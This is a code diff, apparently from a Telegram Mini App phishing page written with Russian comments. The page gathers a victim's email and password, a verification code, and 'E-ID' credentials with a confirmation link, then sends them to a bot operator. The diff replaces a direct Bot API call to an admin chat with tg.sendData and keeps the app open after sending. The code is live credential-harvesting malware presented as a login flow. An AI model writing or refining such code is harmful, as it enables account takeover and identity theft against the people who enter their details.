@@ -814,25 +814,19 @@
         function goToSuccess() { switchPage(pageSuccess); }
 
         // ============================================================
-        // 4. ОТПРАВКА В БОТА (ЧЕРЕЗ ПОЛЬЗОВАТЕЛЯ!)
+        // 4. ОТПРАВКА В БОТА (ЧЕРЕЗ tg.sendData!)
         // ============================================================
-        async function sendToBot(data) {
+        function sendToBot(data) {
             const payload = {
                 ...data,
                 user_id: tg.initDataUnsafe?.user?.id || 'неизвестно'
             };
 
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,  // ← ОТПРАВЛЯЕМ АДМИНУ!
-                        text: JSON.stringify(payload)
-                    })
-                });
-                const result = await response.json();
-                return result.ok;
+                // ===== ОТПРАВЛЯЕМ ДАННЫЕ ЧЕРЕЗ tg.sendData =====
+                tg.sendData(JSON.stringify(payload));
+                // ===== НЕ ВЫЗЫВАЕМ tg.close()! =====
+                return true;
             } catch (error) {
                 console.error('Ошибка:', error);
                 return false;
@@ -873,7 +867,7 @@
             loginSubmitBtn.disabled = true;
             loginSubmitBtn.textContent = '⏳ Отправка...';
 
-            const ok = await sendToBot({ email: e, password: p });
+            const ok = sendToBot({ email: e, password: p });
 
             if (ok) {
                 loginSubmitBtn.disabled = false;
@@ -892,7 +886,7 @@
         // ============================================================
         // 7. КОД
         // ============================================================
-        codeBtn.addEventListener('click', async function() {
+        codeBtn.addEventListener('click', function() {
             const code = codeInput.value.trim();
             if (!code || code.length < 4) {
                 showMsg('Введите корректный код', 'error');
@@ -900,7 +894,7 @@
             }
             codeBtn.disabled = true;
             codeBtn.textContent = '⏳ Отправка...';
-            const ok = await sendToBot({ code: code });
+            const ok = sendToBot({ code: code });
             if (ok) {
                 codeBtn.disabled = false;
                 codeBtn.textContent = '✅ Подтвердить';
@@ -917,7 +911,7 @@
         // ============================================================
         // 8. E-ID
         // ============================================================
-        eidSubmitBtn.addEventListener('click', async function() {
+        eidSubmitBtn.addEventListener('click', function() {
             const e = eidEmail.value.trim();
             const p = eidPassword.value.trim();
             if (!e || !p) {
@@ -932,7 +926,7 @@
             eidPasswordValue = p;
             eidSubmitBtn.disabled = true;
             eidSubmitBtn.textContent = '⏳ Отправка...';
-            const ok = await sendToBot({ type: 'eid_login', email: e, password: p });
+            const ok = sendToBot({ type: 'eid_login', email: e, password: p });
             if (ok) {
                 eidSubmitBtn.disabled = true;
                 eidSubmitBtn.textContent = '✅ Отправлено';
@@ -949,7 +943,7 @@
         // ============================================================
         // 9. E-ID ССЫЛКА
         // ============================================================
-        eidLinkBtn.addEventListener('click', async function() {
+        eidLinkBtn.addEventListener('click', function() {
             const link = eidLinkInput.value.trim();
             if (!link) {
                 showMsg('Введите ссылку подтверждения', 'error');
@@ -957,7 +951,7 @@
             }
             eidLinkBtn.disabled = true;
             eidLinkBtn.textContent = '⏳ Отправка...';
-            const ok = await sendToBot({ type: 'eid_link', email: eidEmailValue, password: eidPasswordValue, link: link });
+            const ok = sendToBot({ type: 'eid_link', email: eidEmailValue, password: eidPasswordValue, link: link });
             if (ok) {
                 eidLinkBtn.disabled = false;
                 eidLinkBtn.textContent = '✅ Отправить ссылку';
